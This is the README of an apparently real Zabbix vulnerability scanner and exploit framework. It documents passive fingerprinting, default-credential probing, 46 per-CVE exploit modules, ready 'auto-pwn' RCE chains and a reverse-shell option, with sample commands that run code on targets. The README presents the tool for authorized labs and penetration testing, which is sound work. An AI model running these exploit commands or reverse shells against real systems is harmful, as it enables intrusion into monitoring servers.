# zbxscan — Zabbix Vulnerability Scanner (2006–2026)

[![Python](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Zabbix](https://img.shields.io/badge/zabbix-2016%E2%80%932026-red)](https://www.zabbix.com)

Passive and active vulnerability scanner for Zabbix (2006–2026). Fingerprints the
installation, matches it against a curated vulnerability database, evaluates
exploitability conditions (including with default credentials), and runs
per-CVE exploit modules — all verified against real Docker containers.

**Out of scope:** denial-of-service only. No DoS modules.

## Features

- **Passive mode** — `apiinfo.version` + HTML/cookie/header fingerprinting
  (nginx/PHP/DB stack), version-aware CVE/advisory matching, per-hit
  exploitability conditions, default-credential probing (`Admin/zabbix`, …)
  with automatic re-evaluation of auth-gated conditions using the found session.
- **Active mode** — 46 per-CVE exploit modules: RCE, SQL injection, auth
  bypass (SAML cookie forging), file read (JS preprocessing), privilege
  escalation, info leaks, trapper/agent-2 protocol bugs, XSS chains.
- **Auto-pwn chains** — ready-made commands for chains that lead to RCE
  (e.g. SQLi → Super Admin session → script RCE), with the target host and
  found credentials already filled in.
- **Curated database** — `db/vulns.json`: 225 records (149 core CVEs,
  36 advisories, 40 component-stack CVEs), cross-branch ranges, fixed-version
  overlap normalization, 2026 records included.
- **Docker verification** — every "works/doesn't work" claim is verified on
  real containers (`scripts/testlab.py`); results in `db/verifications.json`.

## Install

```bash
git clone https://github.com/MNESTRASHNO/zabbix-scanner.git
cd zabbix-scanner
pip install -e .          # provides the `zbxscan` command
```

Requires Python 3.10+ and `requests`.

**Running:** use the console script `zbxscan` after `pip install -e .`, or run the package directly with `python3 -m zbxscan` (no install). The mode is a positional `passive` / `active` (or auto: an `-exp` flag implies `active`, otherwise `passive`):

```bash
zbxscan passive -t 127.0.0.1:8080            # == python3 -m zbxscan passive -t …
zbxscan active -t HOST -exp CVE-…            # == python3 -m zbxscan active -t HOST -exp CVE-…
zbxscan -t HOST -exp CVE-…                   # auto-active
```

## Usage

```bash
# Passive scan (fingerprint + DB match + conditions + default creds)
zbxscan passive -t 127.0.0.1:8080

# Passive with credentials (precise verdicts, auth context)
zbxscan passive -t 127.0.0.1:8080 --user Admin --password zabbix

# Multiple targets / list from file
zbxscan passive -t 127.0.0.1:8080 -t 10.0.0.5:80
zbxscan passive -l targets.txt

# Show ready exploit commands for exploitable hits
zbxscan passive -t 127.0.0.1:8080 --exploits

# Expand component-stack CVE details (PHP/Apache/nginx/DB)
zbxscan passive -t 127.0.0.1:8080 --components

# Active exploit: post-auth script RCE
zbxscan active -t 127.0.0.1:8080 -exp CVE-2021-46088 --user Admin --password zabbix --cmd 'id'

# Active exploit: SQLi -> Super Admin session -> RCE
zbxscan active -t 127.0.0.1:8080 -exp CVE-2024-42327 --user Admin --password zabbix --cmd 'id'

# Exploit module help (usage, prerequisites, verification facts)
zbxscan active -t 127.0.0.1:8080 -exp CVE-2021-46088 --exp-help

# Machine-readable output
zbxscan passive -t 127.0.0.1:8080 --format json
```

### Output

```
[+] Affected Vulns  (✓ = exploit available; →RCE = leads to RCE)
   CRIT: CVE-2023-29453(xss), CVE-2023-32724(memory-corruption), ...

   HIGH: CVE-2021-46088(rce)✓→RCE, CVE-2023-29450(file-read)✓, ...

[+] HAVE AUTO PWN:
   CVE-2021-46088 (rce)  zbxscan -a -t 127.0.0.1:8080 -exp CVE-2021-46088 --user Admin --password zabbix --cmd 'id'
```

## Working CVE PoCs

Verified working exploit modules (run `zbxscan active -t <target> -exp <CVE>`). **34 exploited live**, **8 check-pass** (sink confirmed; full chain needs a victim browser / specific env):

```
CVE-2006-6692        CVE-2013-3628        CVE-2013-3738        CVE-2013-5572     
CVE-2016-10134       CVE-2016-4338        CVE-2019-17382       CVE-2020-11800    
CVE-2021-46088       CVE-2022-23131       CVE-2022-23133       CVE-2022-23134    
CVE-2022-24349       CVE-2022-24917       CVE-2022-24918       CVE-2022-24919    
CVE-2022-46768       CVE-2023-29450       CVE-2023-32727       CVE-2023-32728    
CVE-2024-22116       CVE-2024-22120       CVE-2024-36460       CVE-2024-36464    
CVE-2024-36465       CVE-2024-36466       CVE-2024-36467       CVE-2024-36469    
CVE-2024-42325       CVE-2024-42327       CVE-2025-27232       CVE-2025-27233    
CVE-2025-27234       CVE-2025-27240       CVE-2026-1199        CVE-2026-23921    
CVE-2026-23924       CVE-2026-23925       CVE-2026-23928       CVE-2026-23933    
CVE-2026-59786       ZBX-18134         
```

Not listed (registered but no working remote exploit): CVE-2006-6693 (overflow capped 2047B), CVE-2022-23132 (installer), CVE-2025-27237 (Windows-LPE), CVE-2024-22121 (Windows-MSI).

Each has live, evidence-backed verification in `db/verifications.json`; usage via `zbxscan active -t <target> -exp <CVE> --exp-help`. Interactive reverse shell where RCE applies: `--revshell LHOST:LPORT` (XSS: 23133/24349/24917-19/23928, RCE: 46088 family).


## Database

| File | Contents |
|---|---|
| `db/vulns.json` | 225 records: core CVEs, advisories (ZBX/GHSA/ZBA), component CVEs |
| `db/verifications.json` | per-CVE container verification results |
| `db/credentials.json` | default/common credential pairs |
| `db/pocs.json` | public PoC map (metasploit/exploit-db/GitHub) |
| `db/versions.json` | branch timeline 2016–2026 + Docker image matrix + DB compatibility |

Rebuild the DB from research artifacts:

```bash
python3 scripts/build_db.py
```

## Docker verification lab

```bash
python3 scripts/testlab.py --patch 5.0.5 --keep   # up a 5.0.5 stack, keep it running
python3 scripts/testlab.py --patch 5.0.5 --scan-only
python3 scripts/testlab.py --down                  # drop all lab containers
```

`testlab.py` maps a version to `zabbix-server-pgsql` / `zabbix-web-nginx-pgsql`
images + the matching PostgreSQL, exposes the web UI on a free local port, and
runs the passive scanner against it. Verified versions include 3.0–7.0;
exploited live: CVE-2021-46088, 2013-3628, 2020-11800, 2016-10134,
2022-23131, 2022-23134, 2024-42327, 2024-36465/67, 2025-27232/34/40,
2024-36464, 2022-46768.

## Project layout

```
zbxscan/                  scanner core (Python 3.10+)
  fingerprint.py          apiinfo.version + HTML/cookies/headers, stack detection
  versioning.py           version parsing, ranges (alpha<beta<rc<rel, branch-aware)
  db.py                   access to db/*.json, version/branch record selection
  passive.py              passive mode: fingerprint → DB → conditions → default creds
  exploits/               per-CVE exploit modules (self-registering by record id)
  cli.py                  CLI: passive|active, -t/-l, -exp, --cmd, --user, --db-*
db/                       consolidated vulnerability database (JSON)
research/                 research-phase raw data (sources, notes); input for build_db.py
scripts/
  build_db.py             rebuild db/* from research/* (reproducible)
  testlab.py              docker lab: up/scan/down a specific version stack
```

Only for authorization labs


